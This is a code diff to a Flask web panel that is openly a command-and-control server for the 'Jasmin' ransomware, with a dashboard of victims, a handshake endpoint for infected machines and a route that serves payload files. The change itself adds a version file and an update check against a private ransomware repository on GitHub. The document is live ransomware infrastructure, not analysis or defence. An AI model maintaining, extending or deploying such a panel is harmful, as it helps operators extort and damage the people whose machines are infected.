@@ -150,7 +150,7 @@ def dashboard():
     victims = q.order_by(Victim.id.desc()).offset((page-1)*per_page).limit(per_page).all()
     total_pages = max(1, -(-total // per_page))
     return render_template('dashboard.html', victims=victims, page=page,
-        total_pages=total_pages, total=total, search=search)
+        total_pages=total_pages, total=total, search=search, version=CURRENT_VERSION)
 
 # ── Handshake ──
 @app.route('/handshake', methods=['POST'])
@@ -193,26 +193,38 @@ def download_payload(filename):
     return send_from_directory(PAYLOAD_DIR, filename, as_attachment=True)
 
 # ── Update Check ──
-CURRENT_VERSION = '1.0.0'
+_vf = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'VERSION')
+if not os.path.exists(_vf):
+    _vf = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'VERSION')
+CURRENT_VERSION = open(_vf).read().strip() if os.path.exists(_vf) else '0.0.0'
 
 @app.route('/update')
 @login_required
 def check_update():
     import urllib.request
     token = os.environ.get('GIT_TOKEN','')
-    url = 'https://api.github.com/repos/2016xyz/Jasmin-Ransomware-Private/commits?per_page=1'
-    req = urllib.request.Request(url, headers={'User-Agent':'Jasmin-C2'})
-    if token:
-        req.add_header('Authorization', f'token {token}')
+    headers = {'User-Agent':'Jasmin-C2'}
+    if token: headers['Authorization'] = f'token {token}'
+    # 获取远程VERSION
+    remote_ver = ''
     try:
-        resp = urllib.request.urlopen(req, timeout=10)
-        data = json.loads(resp.read())
+        req = urllib.request.Request('https://raw.githubusercontent.com/2016xyz/Jasmin-Ransomware-Private/master/VERSION', headers=headers)
+        remote_ver = urllib.request.urlopen(req, timeout=10).read().decode().strip()
+    except: pass
+    # 获取最新commit
+    sha=date=msg=''
+    try:
+        req2 = urllib.request.Request('https://api.github.com/repos/2016xyz/Jasmin-Ransomware-Private/commits?per_page=1', headers=headers)
+        data = json.loads(urllib.request.urlopen(req2, timeout=10).read())
         sha = data[0]['sha'][:7]
         date = data[0]['commit']['committer']['date']
         msg = data[0]['commit']['message']
-        return jsonify(ok=True, current=CURRENT_VERSION, latest_commit=sha, date=date, message=msg, update=True)
-    except Exception:
-        return jsonify(ok=True, current=CURRENT_VERSION, latest=CURRENT_VERSION, update=False, msg='无法连接更新服务器')
+    except: pass
+    if not remote_ver and not sha:
+        return jsonify(ok=True, current=CURRENT_VERSION, update=False, msg='无法连接更新服务器')
+    has_update = bool(remote_ver and remote_ver != CURRENT_VERSION)
+    return jsonify(ok=True, update=has_update, current=CURRENT_VERSION,
+        latest=remote_ver or CURRENT_VERSION, latest_commit=sha, date=date, message=msg)
 
 @app.route('/do_update', methods=['POST'])
 @login_required
